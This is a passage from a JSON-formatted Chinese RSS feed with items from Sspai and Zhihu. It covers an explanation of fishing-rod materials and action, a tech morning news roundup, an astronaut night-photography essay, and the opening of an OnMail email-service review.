进行知识管理」，对此系列感兴趣可以在以下渠道找到相关文章：</p>\n<ul>\n<li><a href=\"https://sspai.com/my/column/263/post\">少数派专栏 - 知识管理之术</a></li>\n<li><a href=\"https://xzsj.vip/\">闲者时间博客</a></li>\n<li><a href=\"https://xzsj.icu/\">闲者时间 Medium</a></li>\n</ul>\n<p>玩转 Obsidian 系列目前包括文章：</p>\n<ul>\n<li>《<a href=\"https://sspai.com/post/62414\">玩转 Obsidian 01：用 Obsidian 打造「知识循环」利器</a>》</li>\n<li>《<a href=\"https://sspai.com/post/63481\">玩转 Obsidian 02：基础设置篇</a>》</li>\n<li>《<a href=\"https://sspai.com/post/63674\">玩转 Obsidian 03：如何记录「间歇式日记」</a>》</li>\n<li>《<a href=\"https://sspai.com/post/67339\">玩转 Obsidian 04：为什么推荐使用 Obsidian 做知识管理</a>》</li>\n<li>《<a href=\"https://sspai.com/post/68492\">玩转 Obsidian 05：如何进行阅读及摘要</a>》</li>\n<li>《<a href=\"https://sspai.com/write/69025\">玩转 Obsidian 06：如何用 Obsidian 进行渐进式总结</a>》</li>\n</ul>\n<p>可以在 <a href=\"https://twitter.com/xianzheshijian\">Twitter</a>、<a href=\"https://t.me/xztime\">Telegram</a> 、<a href=\"https://instagram.com/shopkeeper.wang\">instagram</a> 等渠道关注我，获取更多有意思的讯息。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n","link":"https://sspai.com/post/69025"},{"title":"为什么钓鱼鱼竿这么讲究，直接拿根硬棍子，咬钩了往上提不就完了，谁能解释一下？","date":"2021-09-29 02:26:00","description":"\n<p>首先我们先来了解一下</p>\n<p><b>鱼竿的作用</b>主要有四点：</p>\n<p><b>1.鱼竿是费力杠杆（</b><a href=\"http://link.zhihu.com/?target=https%3A//baike.baidu.com/item/%25E5%258A%25A8%25E5%258A%259B%25E8%2587%2582\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">动力臂</a><b>比阻力臂短），优点是省距离，利用杠杆消耗鱼的体力，同时确保鱼的嘴唇不破。</b></p>\n<p>你所说的直接往上提，极有可能钩破鱼嘴从而造成跑鱼的现象。</p>\n<p><b>2.利用弹性来控制鱼的爆发力，也就是我们所说的鱼竿的腰力，减弱鱼的力量，并保护我们的手，同时达到溜鱼的作用，让我们体验溜鱼的快感。</b></p>\n<p>你所说的硬棍子直提，属于生拉硬拽了，这样已经毫无乐趣可言，失去了溜鱼的兴奋感，而且极有可能伤到我们的手臂或手腕。</p>\n<p><b>3.与钓线配合，改变钓点到岸边的距离。</b></p>\n<p>如果只是一根棍子，调节距离不是很方便，而且棍子越长也就越重，在相同长度的情况下，碳素的鱼竿明显是轻于棍子的。</p>\n<p><b>4.把鱼从钓点拉到水边。</b></p>\n<p>这一点木棍也可以做到。</p>\n<p>当然也是可以用棍子钓鱼的，我学钓鱼之初用的就是木棍+风筝线+鹅毛。用木棍钓鱼的话，可以用来初学或者偶尔玩一下也是可以的，不建议长时间使用，除非麒麟臂。</p>\n<p><b>按照鱼竿材质的不同，可以分为三大系列</b></p>\n<p><b>1.竹木钓竿</b></p>\n<p>一般竹木竿具有选材精良、工艺考究、价格低廉、使用方便等优点，绝大多数老钓翁都喜欢用这种鱼竿。一般多用竹子制作，竹制鱼竿品种规格较多，用于制作插式鱼竿的竹子也有近百种。而选用制成鱼竿的竹子，生长期至少要二年以上的老竹。竹要挺拔圆直，粗细均匀，竹壁较厚，无水槽，具有弹性。我国有竹250多种，竹身细长且弹性好的淡竹、多节的紫竹和斑侍、细长圆直壁厚的箬竹和四季竹都是制作鱼竿的好材料。制作同一套鱼竿的竹子成色必须一致，几根竹子排列，竹节最好一样齐，由上往下排列，粗细间距相等，熏火适中，不能老化，插口缠线紧密，涂漆均匀，并应长于插人深度，防止垂钓时受力折断，上下各节配合完整，紧密无间隙，插口不能太薄，无裂痕，全竿装好后，整体要直，受力时弯成圆弧形，不受力时应恢复原状，轻重适度，手握竿根部抖动时应显得有弹性和韧性，外色和谐协调。这种鱼竿不愧为现代品牌鱼竿的鼻祖。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-ab820904cb0250479870123993f6b40f_720w.jpg?rss\" data-rawwidth=\"235\" data-rawheight=\"176\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-ab820904cb0250479870123993f6b40f\" data-watermark-src=\"v2-6b16997032be52a90be7f463c84730c3\" data-private-watermark-src=\"v2-95a3f93cc96b0838f7498dd1e723c79b\" data-tags=\"politic\"></p>\n<p><b>2.玻璃纤维钓竿</b></p>\n<p>又称为玻璃钢竿、玻璃纤维树脂竿。它是采用玻璃纤维缎纹布，经浴浸<a href=\"http://link.zhihu.com/?target=https%3A//baike.baidu.com/item/%25E7%258E%25AF%25E6%25B0%25A7%25E6%25A0%2591%25E8%2584%2582\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">环氧树脂</a>、醛树脂、高温固化成形（空心管或实心竿体），具有较好的坚韧性和弹性，是钓渔竿生产走向现代合成材料、工厂化生产的第一代产品。玻璃纤维钓渔竿具有良好的绝缘性。钓竿成形后未涂装前，竿体颜色黄色、棕色。国内和部分国家和地区生产的钓竿，有的在浴浸树脂液中加入炭黑粉，一方面为同<a href=\"http://link.zhihu.com/?target=https%3A//baike.baidu.com/item/%25E7%25A2%25B3%25E7%25BA%25A4%25E7%25BB%25B4%25E5%25B8%2583/2796414\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">碳纤维布</a>（黑色）混合成形，求得色泽一致；另一方面有的生产企业以染黑<a href=\"http://link.zhihu.com/?target=https%3A//baike.baidu.com/item/%25E7%258E%25BB%25E7%2592%2583%25E7%25BA%25A4%25E7%25BB%25B4%25E5%25B8%2583/1003586\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">玻璃纤维布</a>冒充碳纤维或含碳钓渔竿。玻璃纤维钓竿的特点是强度大，但重量也大，长时间使用，或在高强度的比赛中使用，会非常吃力。这也催生了钓竿行业的素材革命，一种其他领域普遍使用的新素材——碳纤维在钓竿生产中得到了应用。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-8e3af4bf377a65c530ece00742a5a44f_720w.jpg?rss\" data-rawwidth=\"800\" data-rawheight=\"800\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-8e3af4bf377a65c530ece00742a5a44f\" data-watermark-src=\"v2-c9c5e47af8e16f7d4ccd7eb1608aea81\" data-private-watermark-src=\"v2-09e517014d0bf083253790c9aede9763\"></p>\n<p><br></p>\n<p><b>3.碳纤维钓竿</b></p>\n<p>又称为碳素竿，是采用高科技碳维素材制造而成的。具有导电性（Ωcm——1.5×10-3）和非常好的抗张强度（如以12000细丝数单位计算，其抗张强度为kg/mm2——400）。绝大部分碳纤维钓竿者是采用无梭纺碳纤维纵向布制管，经浸树脂固化而制造的。用于钓竿生产方面的碳纤维含量多少，直接决定钓竿的价值和品位。一般含碳量为30%、90%左右。用碳纤维制造的钓竿具有轻、坚实、抗拉强度高的特点，但在使用时应特别注意防电。由于碳纤竿具有良好的导电性，雷雨天和低空裸体电线下绝不能使用，渔线卷在电线上也不能用竿去挑。国内已有数起因使用碳纤竿不当而造成伤亡的报道，敬请各位钓友注意。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-ffbbeab0380f9db05e625d259b721ca7_720w.jpg?rss\" data-rawwidth=\"4000\" data-rawheight=\"3000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-ffbbeab0380f9db05e625d259b721ca7\" data-watermark-src=\"v2-2e9e2e60d9022193445724b66fb9c41b\" data-private-watermark-src=\"v2-1b2951a9a51521b0eed6534dd6a42890\"></p>\n<p><b>鱼竿的调性</b></p>\n<p><b>指</b><a href=\"http://link.zhihu.com/?target=https%3A//baike.baidu.com/item/%25E9%2592%2593%25E9%25B1%25BC%25E7%25AB%25BF\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">钓鱼竿</a><b>竿体的软硬程度</b>。鱼竿调性本意是指碳竿本身的含碳吨位在承受整体拉力所能达到的整体弯度即为调性</p>\n<p>对于一般的传统钓手竿，最简单的调性的区分方法是：将钓竿全长划分10等段，水平持竿，于竿体自然弯曲形成的弧度的切线点所在位置，为判定调性的依据。如弧的切点在前一段为超硬调竿，也称为1.9调性；在前二段为硬调竿，也称为2.8调性，在前三段为中调性竿，也称为3.7调性；在前四段为软调性竿，也称为4.6调性，在前五段为超软调性竿，也称为5.5调性。</p>\n<p><b>总的来说，软竿起鱼的手感非常好，拉起来会比较过瘾。硬竿起鱼速度比较快，适合钓比较大的鱼</b>。</p>\n<p>我们应根据实际作钓的鱼情选择相应调性的鱼竿。</p>\n<p>鱼竿又分为鲫鱼竿、鲤鱼竿、综合竿（又分为大综合和小综合）、还有专门的黑坑竿</p>\n<p><b>如果只是野钓随便玩玩，不需要分太细，买个小综合竿即可</b></p>\n<p><b>希望能对你有所帮助，如有其他问题欢迎咨询留言评论</b></p>\n<p><b>上一波渔获</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-831d74607aa3b4a1a603df4984eddc33_720w.jpg?rss\" data-rawwidth=\"1536\" data-rawheight=\"2048\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-831d74607aa3b4a1a603df4984eddc33\" data-watermark-src=\"v2-bdec42bb5b51e06739dd852b0fe1430f\" data-private-watermark-src=\"v2-5fe7f7dc0cda700ef7b3c63236e35480\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-88e2330d6941c0e0f5eeba187a9b4eaf_720w.jpg?rss\" data-rawwidth=\"1536\" data-rawheight=\"2048\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-88e2330d6941c0e0f5eeba187a9b4eaf\" data-watermark-src=\"v2-41bcf063a3237c8c5affb20e32f01670\" data-private-watermark-src=\"v2-578511c802f9e6ef42e00dca258af590\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-f86ddcb3538cbd8e7f46616444f7975e_720w.jpg?rss\" data-rawwidth=\"1536\" data-rawheight=\"2048\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-f86ddcb3538cbd8e7f46616444f7975e\" data-watermark-src=\"v2-5e9d6bfaa7d96512903d73548b5fa8aa\" data-private-watermark-src=\"v2-be571d316d339efe00d86e05531d8865\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-ce2a94f89a0f70107c3694071b301dcf_720w.jpg?rss\" data-rawwidth=\"1536\" data-rawheight=\"2048\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-ce2a94f89a0f70107c3694071b301dcf\" data-watermark-src=\"v2-6a6cfcedc2297d71323fecc00c5463c5\" data-private-watermark-src=\"v2-0c770d395deb2fe96c107752dd4dd7f6\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-7d6e757bb7532589a8d7d673503ff9f3_720w.jpg?rss\" data-rawwidth=\"2048\" data-rawheight=\"1536\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-7d6e757bb7532589a8d7d673503ff9f3\" data-watermark-src=\"v2-b18529115b21a00886cdabbc51dd3d7c\" data-private-watermark-src=\"v2-4dc2b04cf97a55b1e38c049e912efb80\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-8d88fe3316132e70db3f287e12b7eb26_720w.jpg?rss\" data-rawwidth=\"2048\" data-rawheight=\"1536\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-8d88fe3316132e70db3f287e12b7eb26\" data-watermark-src=\"v2-3c7fe50503c0835cb91df4b96339b432\" data-private-watermark-src=\"v2-42abb42fea0a0b3d18d16bbc015e77ca\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-b3ca88e774eb67a1c7ccb7b155634639_720w.jpg?rss\" data-rawwidth=\"1536\" data-rawheight=\"2048\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-b3ca88e774eb67a1c7ccb7b155634639\" data-watermark-src=\"v2-9f2ebd6cd5fa7bc3c22be77d73f04f3f\" data-private-watermark-src=\"v2-6b12801f61d14ed62d9a07d4a483432b\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-45774158155d15344560a8e843cbb564_720w.jpg?rss\" data-rawwidth=\"1536\" data-rawheight=\"2048\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-45774158155d15344560a8e843cbb564\" data-watermark-src=\"v2-3605e66dcc71f6671ab542508bdc0c9a\" data-private-watermark-src=\"v2-a12efc94161cef21bc5926ed20efdc7f\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-349e0848efad91e1010384bb7aa52c89_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"2774\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-349e0848efad91e1010384bb7aa52c89\" data-watermark-src=\"v2-737609d30083798f85bada6e9778e0e4\" data-private-watermark-src=\"v2-05f3fe9091e835f504427fa024a7bbaf\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/dou-xian-sen-27-6?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">DYH-宇航</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/423533446/answer/2111707443?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">373 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/386687641?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">一个钓鱼爱好者应该有多少支鱼竿？</a><br><a href=\"http://www.zhihu.com/question/384592361?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">初次钓鱼买什么牌子的鱼竿比较合适？</a><br>\n","link":"http://www.zhihu.com/question/423533446/answer/2111707443?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"派早报：微软邀请其他应用商店整合到 Microsoft Store 中、iWork 办公套件迎来更新","date":"2021-09-29 00:54:40","description":"\n<h2><strong>你可能错过的新鲜事</strong></h2>\n<h3>微软邀请其他第三方应用商店整合到 Microsoft Store 中</h3>\n<p>微软于 9 月 28 日进一步的开放了其 Windows 应用商店，邀请其他第三方应用商店整合到 Microsoft Store 中，未来几个月内亚马逊应用商店以及 Epic Games Store 都将在 Microsoft Store 中出现。和其他的应用一样，第三方应用商店将有一个产品详细信息页面，用户可以轻松下载并使用。<a href=\"https://www.theverge.com/2021/9/28/22698196/microsoft-store-third-party-app-stores-epic-games-amazon\">来源</a></p>\n<h3>Apple Music 独家发布周杰伦《地表最强》杜比全景声空间音频版</h3>\n<p>9 月 28 日，周杰伦在 Apple Music 正式独家推出<a href=\"https://music.apple.com/cn/album/%E5%91%A8%E6%9D%B0%E4%BC%A6%E5%9C%B0%E8%A1%A8%E6%9C%80%E5%BC%BA%E4%B8%96%E7%95%8C%E5%B7%A1%E5%9B%9E%E6%BC%94%E5%94%B1%E4%BC%9A-live/1485220306?l=en\" target=\"_blank\">《周杰伦地表最强世界巡回演唱会 (Live)》杜比全景声空间音频版</a>，基于 iOS 15 以及 Apple 动态头部追踪技术的加持，空间音频的聆听体验无疑更上一层楼。当用户通过 AirPods Pro 和 AirPods Max 体验空间音频时，该技术通过追踪你头部的细微动作，让声音围绕着你重新定位，达成更逼真的沉浸感 —— 即音乐来自你周围的环境，而不仅仅是来自耳机。周杰伦也表示借由这项技术创造出更为立体环绕的音响感，让大家听着这张演唱会的 Live 专辑就好像来到了我演唱会的现场一样，在现今可能大家还无法尽情参与演唱会的情况下，回顾之前我演唱会 Live 专辑时可以更有临场感。<a href=\"https://music.apple.com/cn/album/%E5%91%A8%E6%9D%B0%E4%BC%A6%E5%9C%B0%E8%A1%A8%E6%9C%80%E5%BC%BA%E4%B8%96%E7%95%8C%E5%B7%A1%E5%9B%9E%E6%BC%94%E5%94%B1%E4%BC%9A-live/1485220306?l=en\" target=\"_blank\">来源</a></p>\n<h3>Apple 为 iWork 办公套件带来多项新功能</h3>\n<p>Apple 于 9 月 28 日为旗下的 iWork 办公套件增加了多项新功能，其中 Keynote 讲演中可以选择使用前置摄像头，直接在演示文稿中加入现场视频，还可以通过连接 iPhone 以及 iPad 的屏幕内容，使演示更具现场感。同时新增了多演讲者选项可以让所有人都可以轻松用 iPhone、iPad 或者 Mac 控制幻灯片，无论是同一个房间还是远程方式都可以参与演示。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/29/article/19e8c2421bde1236e7a6cce66655c2a5\"></figure><p>针对 Pages 文稿提供了基于 iPhone 的专门优化，屏幕视图会自动在专为 iPhone 屏幕优化的单栏连续流动视图中显示文本、图片等其他元素。文本字号会增大以便阅读，照片和图画会自动缩放以适应屏幕，表格也可横向滚动显示。屏幕视图适用于所有文字处理文档，且无需额外设置。启用此功能后，用户仍可访问 Pages 文稿中的全部编辑工具。用户可随时关闭屏幕视图，以便在打印或发表前查看文档的页面布局。</p>\n<p>Numbers 表格则加入了数据透视表，用户可以快速汇总、分组、重新整理数据，以辨认出模式与趋势，并对它们加以分析——用户可以轻松选取需要的数据，选择如何对其进行分组与汇总，并在边栏访问其他显示选项。创建的数据透视表会呈现一目了然的布局，便于用户阅读数据，获取观点。用户可以通过内容丰富的表格视觉化呈现数据透视表、与其他人共享数据透视表并保持源数据的隐私，甚至从 Microsoft Excel 导入数据透视表，或将数据透视表导出至 Microsoft Excel。此外，雷达图这一新的图表类型可以轻松视觉化对比多个变量，用重叠区域显示它们的相同点，从而凸显不同点和异常值。<a href=\"https://www.apple.com.cn/newsroom/2021/09/apple-unveils-new-features-in-iwork-suite-of-productivity-apps/\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/29/article/24a2368588fe433305d64124f08abffa\"></figure><h3>1Password 将推出隐藏电子邮箱功能</h3>\n<p>1Password 正在推出一项新功能：让用户可以为登录创建独特的电子邮箱别名，形式上和 Apple 的 iCloud Plus 隐藏我的电子邮箱功能基本一致，该功能适用于需要临时注册账户的服务，比如免费的 Wi-Fi，可以用在任何需要注册邮箱账号的领域，邮箱别名不会过期，同时由于和自己真正的邮箱地址有所区隔，因此更为私密安全，也避免了潜在的密码泄露和钓鱼风险。<a href=\"https://www.theverge.com/2021/9/28/22698013/1password-hide-my-email-feature-fastmail-integration\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/29/article/0f3790cc25c83e1080b1e13f0b1b561f\"></figure><h3>DXOMARK 公布 iPhone 13 Pro 相机评分</h3>\n<p>9 月 28 日，DXOMARK 在官网更新 iPhone 13 Pro 的相机评分，综合总分为 137 分，目前在其榜单上排名第四位。<a href=\"https://www.dxomark.com/apple-iphone-13-pro-camera-review-outstanding-video/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/29/article/c22a7d79cba997a808b296e78aed057d\"></figure><h3>罗技发布 MX Key Mini 无线键盘</h3>\n<p>9 月 28 日，罗技发布 MX Key Mini 无线键盘，支持 Windows、macOS、Linux、Android 以及 iOS 等，并支持多设备连接。续航方面，在开启键盘背光的模式下可以使用 10 天，关闭背光使用续航可以长达 5 个月。该设备售价 99.99 美元。<a href=\"https://www.theverge.com/2021/9/28/22687565/logitech-mx-keys-mini-wireless-keyboard-features-price-colors\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/29/article/7dfd1b6922f904cc8c5c82863108e31f\"></figure><h3>吉利宣布进军手机行业</h3>\n<p>9 月 28 日，吉利宣布由李书福创办的湖北星纪时代科技有限公司与武汉经济技术开发区签署战略合作协议，正式进军手机领域。<a href=\"https://m.weibo.cn/status/4686463012441346\" target=\"_blank\">来源</a></p>\n<h2><strong>少数派的近期动态</strong></h2>\n<ul>\n<li>📖 Apple 发布会上没有「One More Thing」？我们给你备上了：《少数派系统指南 · iOS 15》上架预购八折优惠中，更多介绍请前往 <a href=\"https://sspai.com/series/228\" target=\"_blank\">栏目页面</a> 查看。</li>\n<li>\n<a href=\"https://emojipedia.org/mobile-phone/\" target=\"_blank\">📱</a> 你有同时用两部手机的习惯或者经历吗？不妨去 <a href=\"https://sspai.com/bullet/1632293763\" target=\"_blank\">一派</a> 和大家聊聊你是怎么用它们。</li>\n<li>🦦 十一将至，贴心水獭为即将出门远行的你带来了些 <a href=\"https://sspai.com/post/68979\" target=\"_blank\">好东西</a>。</li>\n<li>🎁 少数派会员增刊<a href=\"https://sspai.com/prime/precog/sp-0x00\" target=\"_blank\">《科技漫游》第〇期已经发布</a>，会员群、知识库同期上线，<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=655886576972\" target=\"_blank\">现在购买</a> 可获赠价值 40 元的白描黄金版。</li>\n<li>🎉 少数派正版软件商城 <a href=\"https://sspai.com/mall/discount/%E5%BC%80%E5%AD%A6%E5%AD%A3%E4%BF%83%E9%94%80\" target=\"_blank\">开学季促销</a> 继续进行中，数十款优质软件低至 5 折起。</li>\n<li>📕 由少数派编辑部联合优秀作者出版实体书《数字时代的效率手册》上线电商平台，立即前往 <a href=\"https://item.jd.com/12914331.html\" target=\"_blank\">5 折下单</a>，Kindle 商店电子书版也已上架。</li>\n</ul>\n<h2><strong>你可能错过的文章</strong></h2>\n<ul>\n<li><a href=\"https://sspai.com/post/68997\" target=\"_blank\">戴在手指上的可穿戴设备，能帮你睡个好觉吗？Oura Ring 体验报告</a></li>\n<li><a href=\"https://sspai.com/post/69015\" target=\"_blank\">iOS 15 最受欢迎功能之一，不装 App 轻松实现「图片转文字」：实况文本</a></li>\n<li><a href=\"https://sspai.com/post/69008\" target=\"_blank\">更快的稳定版更新节奏开始了：Chrome/Edge 94 新功能盘点</a></li>\n<li><a href=\"https://sspai.com/post/69021\" target=\"_blank\">App+1 | 重新掌控收件箱，功能丰富的新生代邮箱服务：OnMail</a></li>\n</ul>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69030"},{"title":"【大美·航天】万家灯火","date":"2021-09-28 12:13:17","description":"\n<p>官方发布！航天员摄影作品（三）——“万家灯火”专辑</p>\n<p><br>万家灯火<br><br>中国载人航天工程办公室官方发布神舟十二号航天员第三批在轨拍摄的高清图片。看过了祖国西北绮丽的风光，让航天员们带你从东北一路南下，从东方明珠到101大楼，看航天员眼中祖国的“万家灯火”。</p>\n<p>夕阳最后的光芒洒落在大气层上，形成一条耀眼的光带，光带上方是深邃的太空，下方是中国东北大地上两座巍然耸立的城市——沈阳和长春。密集的灯光下，是橙红油亮的锅包肉，是烟火缭绕的嘈杂夜市，更是老铁们的快意人生。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-aa7c013e1047d78ec571dcd5bc17bbe5_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"673\" data-rawheight=\"673\" class=\"origin_image zh-lightbox-thumb\" width=\"673\" data-original=\"https://pic2.zhimg.com/v2-aa7c013e1047d78ec571dcd5bc17bbe5_r.jpg\"></figure><figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-3e4f07199fd4d03858104ec273974252_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"753\" data-rawheight=\"753\" class=\"origin_image zh-lightbox-thumb\" width=\"753\" data-original=\"https://pic3.zhimg.com/v2-3e4f07199fd4d03858104ec273974252_r.jpg\"></figure><p>自沈阳向南，夜晚的渤海湾畔，葫芦岛市灯火汇聚在一起，自空间站望去如同一颗明星，星星点点的船舶灯光如同散出的星尘。作为著名的不淤不冻良港，葫芦岛担负了中国全面对外开放的重要使命。<br></p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-ba8f1e90585b69a0bec42671ee29bdc5_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-ba8f1e90585b69a0bec42671ee29bdc5_r.jpg\"></figure><figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-cf7518a9b37b7f8bc670d02691f5d816_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"656\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic3.zhimg.com/v2-cf7518a9b37b7f8bc670d02691f5d816_r.jpg\"></figure><p>航天员汤洪波 摄<br><br><br>杭州湾每年呼啸的钱塘江大潮仿佛犹在耳边，长江入海口旁的夜上海从太空眺望下去，无比璀璨。十里洋场烟花地，风云际会上海滩，华灯初上，无数打拼在上海的人们造就了这繁华的盛景。<br></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-c6cccbfd3dac84566c7f83bae4a9d3b7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"627\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-c6cccbfd3dac84566c7f83bae4a9d3b7_r.jpg\"></figure><p>航天员刘伯明 摄<br>9月，江西宜春与新余还带着未消的暑气，“落霞与孤鹜齐飞，秋水共长天一色”。三江五湖、丛山峻岭汇聚于此，对赣鄱大地上的人们既是保护，也是羁绊，让这里的人们爽利不失温和，洒脱之余默默努力。<br></p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-f452dbeea7b8aa354b55772d0642dfd1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-f452dbeea7b8aa354b55772d0642dfd1_r.jpg\"></figure><p>当航天员们从太平洋回首远望这片东方大陆，中国台湾用闪烁的霓虹灯光向航天员汤洪波挥别，夜色正浓，背后的大陆母亲用温柔的臂弯揽住宝岛。望大陆，思故乡，浅浅的台湾海峡连接了千年的血脉之情。<br></p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-f92799a755aa391ab1471191ad4079f6_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic3.zhimg.com/v2-f92799a755aa391ab1471191ad4079f6_r.jpg\"></figure><p><br>当太阳余晖消失天际，意味着明日曙光将现。夜晚的你，无论在干什么，和谁一起，在哪里。当你抬头看向漫天星光的夜空，中国载人航天在默默陪伴着独一无二的你。</p>\n<hr>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wo-men-de-tai-kong?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">我们的太空</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/415083889?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"App+1 | 重新掌控收件箱，功能丰富的新生代邮箱服务：OnMail","date":"2021-09-28 09:30:00","description":"\n<p>最近我找到了一款颜值超高的电子邮件服务，它的名字叫做 OnMail，是由 Edison 公司在 2020 年推出的一款以隐私为中心的电子邮件服务。</p>\n<blockquote>\n<p>OnMail 目前可在 App Store 上用于 iOS。适用于 Android 的新 OnMail 应用程序即将推出。还将开发适用于 Mac 和 Windows 的应用程序。</p>\n<p>OnMail 的电子邮件服务可与任何互联网浏览器一起使用，并与适用于 iOS、Android 和 Mac 的 Edison Mail 应用程序兼容。</p>\n</blockquote>\n<p>而它则包括了授权收件箱、基于自然语言识别的高级搜索以及跟进电子邮件等等特性。</p>\n<h2>许可证</h2>\n<p>现在我们的电子邮件服务器会收到大量的垃圾邮件，各种促销折扣、服务更新、新闻还有牛皮癣广告会充斥我们的电子邮件服务器，这是因为邮件的本意就和挂号信一样，只要对方有你的地址，就可以给你寄送信件。</p>\n<p>为了避免这些垃圾信息，我们不得不花大量的时间来设置过滤、黑名单，但是治标不治本。因为他们可以随时更换邮箱号、设置不同的关键词甚至是图片、PDF 等等，而且我们更换自己的邮箱成本太高了。所以 OnMail 提出的解决办法是，让用户发放许可权限给其他邮箱号。OnMail 提供了一种「基于许可的电子邮件服务」，只有获得权限的邮箱号才能够发送邮件送到你的收件箱，智能、有效的杜绝了所有的不必要的垃圾信息进入我们的系统，这样就从根本上解决了轰炸的源头。每次你收到一个新的邮箱或联系人给你发送邮件，你的 OnMail 